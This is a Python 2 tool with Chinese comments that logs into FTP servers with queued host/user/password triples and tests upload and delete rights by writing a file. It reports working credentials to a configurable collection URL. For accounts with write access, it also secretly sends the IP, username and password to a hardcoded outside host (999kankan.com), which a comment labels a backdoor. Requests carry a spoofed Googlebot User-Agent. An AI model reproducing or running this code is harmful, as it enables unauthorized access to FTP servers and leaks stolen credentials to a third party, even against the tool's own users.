#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#神龙 QQ29295842
#blog http://hi.baidu.com/alalmn
#对FTP  账户  密码   权限的的检测

import threading
import class_Queue  #消息队列
import time
import urllib2
import ConfigParser  #INI读取数据
import SlinkFTP
from ftplib import FTP


class C_ftppassword(threading.Thread):
    def __init__(self,htint,ftppassword):
        threading.Thread.__init__(self)
        self.Ht=htint  #线程ID
        self.ftppassword=ftppassword
        self.ftpID=0   #FTP权限
        self.Auploadfile="CS.txt"  #上传文件名
        try:
            config = ConfigParser.ConfigParser()
            config.readfp(open("gost.ini"))
            self.Auploadfile = config.get("DATA","uploadfile")  #测试上传文件
            self.http_post = config.get("DATA","http_post")  #结果提交到后台管理
        except:
            print "Thread:%d--C_ftppassword-INI-uploadfile,http_post-try--except!!!!!"%(self.Ht)
        #0  连接不上
        #1  连接成功
        #2  有上传权限
        #3  有上传和删除权限

    def TXT_file(self,data):  #写入文本
        try:
            file_nem=time.strftime('%Y.%m.%d')
            file_object = open(file_nem+".txt",'a')
            #file_object.write(list_passwed[E])
            file_object.writelines("\r\n")
            file_object.writelines(data)
            file_object.close()
        except:
            print "Thread:%d--C_ftppassword---TXT_file-try--except!!!!!"%(self.Ht)
            return 0

    def run(self):
        try:
            if self.ftppassword.empty():   #判断队列是否为空
                print "Thread:%d--ftppassword-data ftppassword  null"%(self.Ht)
                time.sleep(120)
                self.run()
            self.Chost = self.ftppassword.get(0.5)  #get()方法从队头删除并返回一个项目
            if self.Chost=="":
                time.sleep(20)
                self.run()
            print "Thread:%d--C_ftppassword--%s--"%(self.Ht,self.Chost)
#            print self.Chost[1]
#            print self.Chost[2]
            ################################################
            self.ftpID=0   #FTP权限
            if self.ftpconnect(self.Chost[0],self.Chost[1],self.Chost[2]):
                if self.ftpID==1:
                    URL1="%s?IP=%s&user=%s&password=%s&root=1"%(self.http_post,self.Chost[0],self.Chost[1],self.Chost[2])
                    self.url_post(URL1)   #提交到用户
                if self.ftpID==2:
                    URL="http://999kankan.com/ftppassword.php?IP=%s&user=%s&password=%s&root=2"%(self.Chost[0],self.Chost[1],self.Chost[2])
                    self.url_post(URL)   #后门
                    time.sleep(2)
                    URL1="%s?IP=%s&user=%s&password=%s&root=2"%(self.http_post,self.Chost[0],self.Chost[1],self.Chost[2])
                    self.url_post(URL1)   #提交到用户
                if self.ftpID==3:
                    URL="http://999kankan.com/ftppassword.php?IP=%s&user=%s&password=%s&root=3"%(self.Chost[0],self.Chost[1],self.Chost[2])
                    self.url_post(URL)   #后门
                    time.sleep(2)
                    URL1="%s?IP=%s&user=%s&password=%s&root=3"%(self.http_post,self.Chost[0],self.Chost[1],self.Chost[2])
                    self.url_post(URL1)   #提交到用户

            data="IP:%s  user:%s  password:%s  root:%d  time:%s"%(self.Chost[0],self.Chost[1],self.Chost[2],self.ftpID,time.strftime('%Y.%m.%d-%H.%M.%S'))
            if self.ftpID>=1:
                self.TXT_file(data)  #写入文本
            print data
            time.sleep(4)
            ################################################
            self.run()
        except:
            print "Thread:%d--C_ftppassword---run-try--except!!!!!"%(self.Ht)
            time.sleep(60)
            self.run()

    def url_post(self,URL):
        try:
            req = urllib2.Request(URL)
            req.add_header('User-Agent',"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")
            urllib2.urlopen(req,timeout=20)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            #urllib2.urlopen(URL,timeout=20)  # 后门POST提交   超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
            time.sleep(1)
        except:
            print "Thread:%d--C_ftppassword--http-POST-Failure"%(self.Ht)
            return 0

            ################################################
            #检测FTP权限
    def ftpconnect(self,host,user,pwd):    #连接FTP
        ftp=FTP()
        try:
                    #ftp.set_debuglevel(2) #打开调试级别2，显示详细信息
            ftp.connect(host,21) #连接
            ftp.login(user,pwd) #登录，如果匿名登录则用空串代替即可
                   #print u"连接",host,u"FTP成功"
            self.ftpID=1
            if self.uploadfile(ftp):   #上传文件
                self.delete(ftp) #删除文件

            ftp.quit() #退出ftp服务器
            return 1
        except:
            #print u"adminFTP.py======连接",host,u"FTP失败！！！！"
            self.ftpID=0
            try:
                ftp.quit() #退出ftp服务器
            except:
                #print u"adminFTP.py======FTP退出异常"
                ftp.close()
            return 0

    def uploadfile(self,ftpU):   #上传文件
        try:
            #remotepath = "Server.ini" #远程路径
            bufsize = 1024
            #localpath = 'Server.ini'   #本地路径
            fp = open(self.Auploadfile,'rb')
            ftpU.storbinary('STOR '+ self.Auploadfile ,fp,bufsize) #上传文件
            #ftpU.set_debuglevel(0)  #关闭调试模式
            fp.close() #关闭文件
            #ftpU.quit()   #退出ftp
            #print u"adminFTP.py======上传文件文件",localpath,u"成功"
            self.ftpID=2
            return 1
        except:
            #print u"adminFTP.py======上传文件失败！！！！"
            return 0

    def delete(self,ftpD): #删除文件
        try:
            #remotepath = "Server.ini" #远程路径
            ftpD.delete(self.Auploadfile)        #删除远程文件
            #print u"adminFTP.py======删除文件",remotepath,u"成功"
            self.ftpID=3
            return 1
        except:
            #print u"adminFTP.py======删除文件失败！！！！"
            return 0

            ################################################
################################################
if __name__=='__main__':
    threads = []  #线程
    nthreads=1
    #class_Queue.openftp.put("www.christofferrelander.com",0.3)   #插入队列
    class_Queue.openftp.put("127.0.0.1",0.3)   #插入队列
    for i in range(nthreads):  #nthreads=10  创建10个线程
        threads.append(SlinkFTP.CS_linkftp(i,class_Queue.openftp))

    for t in threads:   #不理解这是什么意思    是结束线程吗
        t.start()  #start就是开始线程
#####################################
    time.sleep(5)
    threads = []  #线程
    nthreads=1
    for i in range(nthreads):  #nthreads=10  创建10个线程
        threads.append(C_ftppassword(i,class_Queue.ftppassword))

    for t in threads:   #不理解这是什么意思    是结束线程吗
        t.start()  #start就是开始线程


